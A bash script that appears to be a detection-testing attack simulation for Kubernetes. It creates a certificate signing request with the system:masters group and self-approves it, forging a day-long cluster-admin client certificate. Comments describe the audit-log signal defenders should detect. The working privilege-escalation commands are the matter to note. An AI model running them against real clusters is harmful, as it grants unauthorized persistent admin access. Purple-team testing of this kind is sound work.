#!/bin/bash
# ============================================================================
# Attack Simulation: Client Certificate Credential via CSR (Self-Approved)
# MITRE ATT&CK: T1098 - Account Manipulation
# Stratus technique: k8s.persistence.create-client-certificate
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh   (needs openssl)
# Fires detection: detections/kql/create-client-certificate.kql (AKSAuditAdmin)
# ============================================================================
#
# TACTIC: Persistence (TA0003) / Account Manipulation (T1098). Kubernetes can mint a
# client certificate from a CertificateSigningRequest (CSR). By requesting a cert whose
# subject Organization is `system:masters` — the built-in cluster-admin group — and
# then approving it, an attacker forges a durable admin credential that survives token
# rotation and isn't tied to any ServiceAccount.
#
# THIS IS AN INTENTIONAL ATTACK SIMULATION for detection testing.
#
# The signal: the SAME principal both CREATES the CSR and UPDATES its /approval
# subresource (self-approval). Legitimate PKI separates requester from approver.
#
# WHAT A DEFENDER SHOULD SEE: in AKSAuditAdmin, one identity performing a `create`
# on certificatesigningrequests immediately followed by an `update` on the
# .../approval subresource — the requester approving their own certificate.

# Abort on any error so a half-built CSR doesn't get submitted.
set -e
# Unique per-run names for the CSR object and the key/request files under /tmp.
CSR="adversary-lab-csr-$(date +%s)"
KEY="/tmp/${CSR}.key"
REQ="/tmp/${CSR}.csr"

echo "[*] Generating key + CSR for CN=adversary-lab-attacker (O=system:masters)..."
# Generate a 2048-bit RSA private key (stderr silenced for clean output).
openssl genrsa -out "$KEY" 2048 2>/dev/null
# Build the CSR. The subject is the payload: CN names the identity, and O=system:masters
# is the built-in group that grants unrestricted cluster-admin once the cert is issued.
openssl req -new -key "$KEY" -out "$REQ" -subj "/CN=adversary-lab-attacker/O=system:masters"
# Kubernetes expects the CSR PEM base64-encoded on a single line; encode it and strip newlines.
B64=$(base64 < "$REQ" | tr -d '\n')

echo "[*] Submitting CSR: $CSR"
# Submit the CertificateSigningRequest object to the API server via an inline manifest.
cat <<EOF | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: $CSR
  labels: { adversary-lab/cleanup: "true", adversary-lab/mitre: "T1098" }
spec:
  request: $B64                                    # the base64 CSR generated above
  signerName: kubernetes.io/kube-apiserver-client  # signer that mints client-auth certs
  expirationSeconds: 86400                          # 1-day cert (enough to demonstrate)
  usages: ["client auth"]                           # cert is usable to authenticate as a client
EOF

echo "[*] Self-approving the CSR (same principal — this is the anomaly)..."
# The critical, anomalous step: the same identity that filed the CSR now approves it,
# hitting the certificates/approval subresource. In sane PKI, requester != approver.
kubectl certificate approve "$CSR"

echo ""
# Operator-facing hints plus manual cleanup for the CSR object and the local key/req files.
echo "[*] Expected detection: T1098 - Self-Approved Client Certificate"
echo "[*] Expected log table: AKSAuditAdmin  (create CSR + update .../approval, one user)"
echo "[!] Cleanup: kubectl delete csr $CSR ; rm -f $KEY $REQ"
